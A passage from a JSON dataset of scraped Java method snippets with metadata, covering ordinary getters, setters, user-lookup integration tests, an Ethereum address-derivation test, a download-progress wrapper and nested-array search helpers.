"class_name": "Log", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setClose( String close )\n\t\t{\n\t\t\tthis.close = close;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55631, "method_name": "getLastModify", "class_name": "Log", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getLastModify()\n\t\t{\n\t\t\treturn lastModify;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55632, "method_name": "setLastModify", "class_name": "Log", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setLastModify( String lastModify )\n\t\t{\n\t\t\tthis.lastModify = lastModify;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55633, "method_name": "init", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        userOne = new User();\n        userOne.setLogin(USER_ONE_LOGIN);\n        userOne.setPassword(RandomStringUtils.random(60));\n        userOne.setActivated(true);\n        userOne.setEmail(USER_ONE_EMAIL);\n        userOne.setFirstName(\"userOne\");\n        userOne.setLastName(\"doe\");\n        userOne.setLangKey(\"en\");\n        userOne.setBankAccountIBAN(DEFAULT_IBAN);\n        userRepository.save(userOne);\n\n        userTwo = new User();\n        userTwo.setLogin(USER_TWO_LOGIN);\n        userTwo.setPassword(RandomStringUtils.random(60));\n        userTwo.setActivated(true);\n        userTwo.setEmail(USER_TWO_EMAIL);\n        userTwo.setFirstName(\"userTwo\");\n        userTwo.setLastName(\"doe\");\n        userTwo.setLangKey(\"en\");\n        userTwo.setBankAccountIBAN(DEFAULT_IBAN);\n        userRepository.save(userTwo);\n\n        userThree = new User();\n        userThree.setLogin(USER_THREE_LOGIN);\n        userThree.setPassword(RandomStringUtils.random(60));\n        userThree.setActivated(false);\n        userThree.setEmail(USER_THREE_EMAIL);\n        userThree.setFirstName(\"userThree\");\n        userThree.setLastName(\"doe\");\n        userThree.setLangKey(\"en\");\n        userThree.setBankAccountIBAN(DEFAULT_IBAN);\n        userRepository.save(userThree);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55634, "method_name": "assertThatUserCanBeFoundByLogin", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assertThatUserCanBeFoundByLogin() {\n        UserDetails userDetails = domainUserDetailsService.loadUserByUsername(USER_ONE_LOGIN);\n        assertThat(userDetails).isNotNull();\n        assertThat(userDetails.getUsername()).isEqualTo(USER_ONE_LOGIN);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55635, "method_name": "assertThatUserCanBeFoundByLoginIgnoreCase", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assertThatUserCanBeFoundByLoginIgnoreCase() {\n        UserDetails userDetails = domainUserDetailsService.loadUserByUsername(USER_ONE_LOGIN.toUpperCase(Locale.ENGLISH));\n        assertThat(userDetails).isNotNull();\n        assertThat(userDetails.getUsername()).isEqualTo(USER_ONE_LOGIN);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55636, "method_name": "assertThatUserCanBeFoundByEmail", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assertThatUserCanBeFoundByEmail() {\n        UserDetails userDetails = domainUserDetailsService.loadUserByUsername(USER_TWO_EMAIL);\n        assertThat(userDetails).isNotNull();\n        assertThat(userDetails.getUsername()).isEqualTo(USER_TWO_LOGIN);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55637, "method_name": "assertThatUserCanBeFoundByEmailIgnoreCase", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assertThatUserCanBeFoundByEmailIgnoreCase() {\n        UserDetails userDetails = domainUserDetailsService.loadUserByUsername(USER_TWO_EMAIL.toUpperCase(Locale.ENGLISH));\n        assertThat(userDetails).isNotNull();\n        assertThat(userDetails.getUsername()).isEqualTo(USER_TWO_LOGIN);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55638, "method_name": "assertThatEmailIsPrioritizedOverLogin", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assertThatEmailIsPrioritizedOverLogin() {\n        UserDetails userDetails = domainUserDetailsService.loadUserByUsername(USER_ONE_EMAIL);\n        assertThat(userDetails).isNotNull();\n        assertThat(userDetails.getUsername()).isEqualTo(USER_ONE_LOGIN);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55639, "method_name": "assertThatUserNotActivatedExceptionIsThrownForNotActivatedUsers", "class_name": "DomainUserDetailsServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assertThatUserNotActivatedExceptionIsThrownForNotActivatedUsers() {\n        assertThatExceptionOfType(UserNotActivatedException.class).isThrownBy(\n            () -> domainUserDetailsService.loadUserByUsername(USER_THREE_LOGIN));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/DomainUserDetailsServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55640, "method_name": "setPricePerMonth", "class_name": "GardenField", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setPricePerMonth() {\n        this.pricePerMonth = this.pricePerM2 * this.sizeInM2 * GardenField.PRIZE_CALCULATION_PERIOD_IN_DAYS;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/domain/GardenField.java", "stars": "2", "class_props": {"extends": "AbstractDeletableAuditingEntity", "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 55641, "method_name": "deriveAddress", "class_name": "EthTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deriveAddress() {\n        String[] addr = new String[] {\n                \"0xE410157345be56688F43FF0D9e4B2B38Ea8F7828\",\n                \"0xEEACb7a5e53600c144C0b9839A834bb4b39E540c\",\n                \"0xA116800A72e56f91cF1677D40C9984f9C9f4B2c7\",\n                \"0x4826BadaBC9894B3513e23Be408605611b236C0f\",\n                \"0x8a1503beb17Ef02cC4Ff288b0A73583c4ce547c7\",\n                \"0x996c7a5c9001da0401B61aD68EFd2424633F728E\",\n                \"0xcAC3561d0b4Bec860ADCEBD70f8E6a8A5D45D752\",\n                \"0x7173684414e3a9d5347e5d73b1E8718f3020A296\",\n                \"0x4AAb5aD4FF70D7388182068a0B74BEEBA28B5068\",\n                \"0x824C70B0000Abf51F6db46284dC217579f53f86a\",\n                \"0x56FA9453B22867E0292301b68C2A737D8879441B\",\n                };\n        String pubKey = \"xpub6CNhtuXAHDs84AhZj5ALZB6ii4sP5LnDXaKDSjiy6kcBbiysq89cDrLG29poKvZtX9z4FchZKTjTyiPuDeiFMUd1H4g5zViQxt4tpkronJr\";\n        for (int i = 0 ; i < addr.length; i++) {\n            String address = new Eth.Deriver().derive(pubKey,0,i);\n            assertEquals(address,addr[i]);\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/test/java/com/cobo/coinlib/coin/EthTest.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55642, "method_name": "contentType", "class_name": "DownloadResponseBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaType", "snippet": "    public MediaType contentType() {\n        return responseBody.contentType();\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/DownloadResponseBody.java", "stars": "1", "class_props": {"extends": "ResponseBody", "implements": null, "modifiers": ["public"]}}, {"id": 55643, "method_name": "contentLength", "class_name": "DownloadResponseBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long contentLength() {\n        return responseBody.contentLength();\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/DownloadResponseBody.java", "stars": "1", "class_props": {"extends": "ResponseBody", "implements": null, "modifiers": ["public"]}}, {"id": 55644, "method_name": "source", "class_name": "DownloadResponseBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BufferedSource", "snippet": "    public BufferedSource source() {\n        if (bufferedSource == null) {\n            bufferedSource = Okio.buffer(source(responseBody.source()));\n        }\n        return bufferedSource;\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/DownloadResponseBody.java", "stars": "1", "class_props": {"extends": "ResponseBody", "implements": null, "modifiers": ["public"]}}, {"id": 55645, "method_name": "source", "class_name": "DownloadResponseBody", "params": ["Source"], "throws": null, "modifiers": ["private"], "return_type": "Source", "snippet": "    private Source source(Source source) {\n        return new ForwardingSource(source) {\n            long totalBytesRead = 0L;\n\n            @Override\n            public long read(Buffer sink, long byteCount) throws IOException {\n                final long bytesRead = super.read(sink, byteCount);\n                if (null != downloadListener) {\n                    totalBytesRead += bytesRead != -1 ? bytesRead : 0;\n                    final int progress = (int) (totalBytesRead * 100 / responseBody.contentLength());\n//                    if (ILogger.DEBUG) {\n//                        ILogger.t(\"download\").w(\"\u5df2\u7ecf\u4e0b\u8f7d\u7684\uff1a\"\n//                                + totalBytesRead + \"\u5171\u6709\uff1a\" + responseBody.contentLength()\n//                                + \"\uff0cprogress\uff1a\" + progress);\n//                    }\n                    if (executor != null) {\n                        executor.execute(() -> downloadListener.onProgress(progress));\n                    } else {\n                        downloadListener.onProgress(progress);\n                    }\n                }\n                return bytesRead;\n            }\n        };\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/DownloadResponseBody.java", "stars": "1", "class_props": {"extends": "ResponseBody", "implements": null, "modifiers": ["public"]}}, {"id": 55646, "method_name": "onCreate", "class_name": "DemoSimple", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_demo_simple);\n\n        Resources res = getResources();\n        final String description = res.getString(R.string.pin_desc_kitten);\n        ((TextView) findViewById(R.id.desc_tv)).setText(description);\n        mImage = (ImageView) findViewById(R.id.source_iv);\n\n        // Show the remote image in ImageView.\n        new DemoHelper.RemoteImageTask(mImage, IMAGE_SOURCE).execute();\n\n        PinItButton pinIt = (PinItButton) findViewById(R.id.pin_bt);\n        pinIt.setImageUrl(IMAGE_SOURCE);\n        pinIt.setUrl(WEB_URL);\n        pinIt.setDescription(description);\n        pinIt.setListener(_listener);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/PinItDemo/src/com/pinterest/samples/pinit/DemoSimple.java", "stars": "74", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 55647, "method_name": "exec", "class_name": "GBoardWrite", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String exec(HttpServletRequest req, HttpServletResponse resp) {\n\t\tString view = \"/gBoard/gBoardWrite.jsp\";\n\t\t// \ub9cc\uc57d \ub85c\uadf8\uc778 \ud558\uc9c4 \uc54a\uc558\uac70\ub098 \uc774\ubbf8 \ubc29\uba85\ub85d\uc744 \uc791\uc131\ud55c \uc0ac\ub78c\uc740 \ub85c\uadf8\uc778\ud398\uc774\uc9c0\ub098 \ubc29\uba85\ub85d \ub9ac\uc2a4\ud2b8\ud398\uc774\uc9c0\ub85c \uc774\ub3d9\ud574\uc57c \ud55c\ub2e4.\n\t\t// \ub85c\uadf8\uc778 \ud558\uc9c0 \uc54a\uc740 \uc0ac\ub78c\uc774 \uc694\uccad\ud558\ub294 \uacbd\uc6b0 \ucc98\ub9ac\n\t\tHttpSession session = req.getSession();\n\t\tString sid = (String) session.getAttribute(\"SID\");\n\t\tif(sid == null || sid.length() == 0) {\n\t\t\tview = \"/clsProj/member/login.cls\";\n\t\t\treq.setAttribute(\"isRedirect\", true);\n\t\t}\n\t\t// \uc774\ubbf8 \ubc29\uba85\ub85d\uc744 \uc791\uc131\ud55c \uc0ac\ub78c\uc774 \uc694\uccad\ud558\ub294 \uacbd\uc6b0\n\t\tGBoardDAO gDAO = new GBoardDAO();\n\t\tint cnt = gDAO.getCnt(sid);\n\t\tif(cnt == 1) {\n\t\t\tview = \"/clsProj/gBoard/gBoardList.cls\";\n\t\t\treq.setAttribute(\"isRedirect\", true);\n\t\t}\n\t\treturn view;\n\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/controller/gBoard/GBoardWrite.java", "stars": "2", "class_props": {"extends": null, "implements": ["ClsController"], "modifiers": ["public"]}}, {"id": 55648, "method_name": "getFreeIpResourceRangeList", "class_name": "ResourceDAO", "params": ["Set<Integer>", "int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IpResourceRange>", "snippet": "\tpublic List<IpResourceRange> getFreeIpResourceRangeList(Set<Integer> categoryIds, int range, int max) throws BGException {\n\t\tRequestJsonRpc req = new RequestJsonRpc(RESOURCE_MODULE_ID, moduleId, \"ResourceService\",\n\t\t\t\t\"freeIpResourceRangeList\");\n\t\tDate now = new Date();\n\t\treq.setParam(\"ipResourceCategoryIds\", categoryIds);\n\t\treq.setParam(\"range\", range);\n\t\treq.setParam(\"max\", max);\n\t\treq.setParam(\"dateFrom\", now);\n\t\treq.setParam(\"dateTo\", now);\n\t\t\n\t\tJsonNode ret = transferData.postDataReturn(req, user);\n\t\tList<IpResourceRange> result = readJsonValue(ret.traverse(),\n\t\t\t\tjsonTypeFactory.constructCollectionType(List.class, IpResourceRange.class));\n\t\t\n\t\t// \u043f\u0435\u0440\u0435\u043a\u043e\u0434\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 IP \u0430\u0434\u0440\u0435\u0441\u043e\u0432\n\t\tfor (IpResourceRange r : result) {\n\t\t\tr.setFrom(IPUtils.base64ToString(r.getFrom()));\n\t\t\tr.setTo(IPUtils.base64ToString(r.getTo()));\n\t\t}\n\t\t\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ResourceDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 55649, "method_name": "isKnownValue", "class_name": "StringValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isKnownValue() {\n    return true;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55650, "method_name": "isRequiredInCode", "class_name": "StringValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isRequiredInCode() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55651, "method_name": "combine", "class_name": "StringValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CodeReferenceValue", "snippet": "  public CodeReferenceValue combine() {\n    return this;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55652, "method_name": "equalsWith", "class_name": "StringValue", "params": ["CodeReferenceValue"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equalsWith(CodeReferenceValue obj) {\n    if (this == obj)\n      return true;\n    if (obj instanceof StringValue) {\n      return ((StringValue) obj).value.equals(value);\n    }\n    return false;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55653, "method_name": "cloneInstructions", "class_name": "StringValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "InsnList", "snippet": "  public InsnList cloneInstructions() {\n    return Instructions.singleton(new LdcInsnNode(value));\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55654, "method_name": "getInstructions", "class_name": "StringValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "InsnList", "snippet": "  public InsnList getInstructions() {\n    return Instructions.singleton(node);\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55655, "method_name": "getStackValueOrNull", "class_name": "StringValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getStackValueOrNull() {\n    return value;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/analysis/rewriter/value/values/StringValue.java", "stars": "140", "class_props": {"extends": "CodeReferenceValue", "implements": null, "modifiers": ["public"]}}, {"id": 55656, "method_name": "findQuestionListLikeThis", "class_name": "QuestionService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> findQuestionListLikeThis(String preName) {\n\n        CompletionSuggestionBuilder suggestionBuilder = SuggestBuilders.completionSuggestion(\"questionName.suggest\")\n                .prefix(preName, Fuzziness.AUTO).size(10);\n\n        SuggestBuilder suggestBuilder = new SuggestBuilder();\n        suggestBuilder.addSuggestion(\"suggesttions\", suggestionBuilder);\n\n        SearchResponse suggestResposne = elasticsearchTemplate.suggest(suggestBuilder, Question.class);\n        // \u83b7\u53d6\u51fa\u5efa\u8bae\u5c01\u88c5\u5bf9\u8c61\n        Suggest suggest = suggestResposne.getSuggest();\n        HashSet suggestSet = new HashSet();\n        int maxSuggest = 0;\n        if (suggest != null) {\n            Suggest.Suggestion result = suggest.getSuggestion(\"suggesttions\");//\u83b7\u53d6suggest,name\u4efb\u610fstring\n            for (Object term : result.getEntries()) {\n                if (term instanceof CompletionSuggestion.Entry) {\n                    CompletionSuggestion.Entry item = (CompletionSuggestion.Entry) term;\n                    if (!item.getOptions().isEmpty()) {\n                        //\u82e5item\u7684option\u4e0d\u4e3a\u7a7a,\u5faa\u73af\u904d\u5386\n                        for (CompletionSuggestion.Entry.Option option : item.getOptions()) {\n                            String tip = option.getText().toString();\n                            if (!suggestSet.contains(tip)) {\n                                suggestSet.add(tip);\n                                ++maxSuggest;\n                            }\n                        }\n                    }\n                }\n                if (maxSuggest >= 5) {\n                    break;\n                }\n            }\n        }\n        return new ArrayList<>(suggestSet);\n    }", "url": "https://raw.githubusercontent.com/zhuchangwu/lawyer-lover-cloud-backend/master/lawyer-lover-main/src/main/java/com/changwu/service/QuestionService.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55657, "method_name": "findOneByQuestionName", "class_name": "QuestionService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<Question>", "snippet": "    public List<Question> findOneByQuestionName(String questionName) {\n        NativeSearchQueryBuilder queryBuilder = new NativeSearchQueryBuilder();\n        BoolQueryBuilder boolQueryBuilder = QueryBuilders.boolQuery();\n        boolQueryBuilder.should(QueryBuilders.matchPhraseQuery(\"questionName\", questionName))\n                .must(QueryBuilders.matchQuery(\"questionName\", questionName));\n        queryBuilder.withQuery(boolQueryBuilder);\n        queryBuilder.withPageable(PageRequest.of(0, 5));\n        Page<Question> search = repository.search(queryBuilder.build());\n        List<Question> content = search.getContent();\n        if (content.size() == 0)\n            throw new MyException(ExceptionEnum.CAN_NOT_FIND_ANY_ANSWER);\n        return content;\n    }", "url": "https://raw.githubusercontent.com/zhuchangwu/lawyer-lover-cloud-backend/master/lawyer-lover-main/src/main/java/com/changwu/service/QuestionService.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55658, "method_name": "findOneByQuestionName1", "class_name": "QuestionService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<Question>", "snippet": "    public List<Question> findOneByQuestionName1(String questionName) {\n        NativeSearchQueryBuilder queryBuilder = new NativeSearchQueryBuilder();\n        BoolQueryBuilder boolQueryBuilder = QueryBuilders.boolQuery();\n        return null;\n    }", "url": "https://raw.githubusercontent.com/zhuchangwu/lawyer-lover-cloud-backend/master/lawyer-lover-main/src/main/java/com/changwu/service/QuestionService.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55659, "method_name": "find1", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find1(int value, int[] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tif (array[a] == value)\n\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55660, "method_name": "find2", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find2(int value, int[][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tif (array[a][b] == value)\n\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55661, "method_name": "find3", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find3(int value, int[][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tif (array[a][b][c] == value)\n\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55662, "method_name": "find4", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find4(int value, int[][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tif (array[a][b][c][d] == value)\n\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55663, "method_name": "find5", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find5(int value, int[][][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tfor(int e = 0; e < array[0][0][0][0].length; e++)\n\t\t\t\t\t\t\tif (array[a][b][c][d][e] == value)\n\t\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55664, "method_name": "find6", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find6(int value, int[][][][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tfor(int e = 0; e < array[0][0][0][0].length; e++)\n\t\t\t\t\t\t\tfor(int f = 0; f < array[0][0][0][0][0].length; f++)\n\t\t\t\t\t\t\t\tif (array[a][b][c][d][e][f] == value)\n\t\t\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55665, "method_name": "find7", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find7(int value, int[][][][][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tfor(int e = 0; e < array[0][0][0][0].length; e++)\n\t\t\t\t\t\t\tfor(int f = 0; f < array[0][0][0][0][0].length; f++)\n\t\t\t\t\t\t\t\tfor(int g = 0; g < array[0][0][0][0][0][0].length; g++)\n\t\t\t\t\t\t\t\t\tif (array[a][b][c][d][e][f][g] == value)\n\t\t\t\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55666, "method_name": "find8", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find8(int value, int[][][][][][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tfor(int e = 0; e < array[0][0][0][0].length; e++)\n\t\t\t\t\t\t\tfor(int f = 0; f < array[0][0][0][0][0].length; f++)\n\t\t\t\t\t\t\t\tfor(int g = 0; g < array[0][0][0][0][0][0].length; g++)\n\t\t\t\t\t\t\t\t\tfor(int h = 0; h < array[0][0][0][0][0][0][0].length; h++)\n\t\t\t\t\t\t\t\t\t\tif (array[a][b][c][d][e][f][g][h] == value)\n\t\t\t\t\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55667, "method_name": "find9", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find9(int value, int[][][][][][][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tfor(int e = 0; e < array[0][0][0][0].length; e++)\n\t\t\t\t\t\t\tfor(int f = 0; f < array[0][0][0][0][0].length; 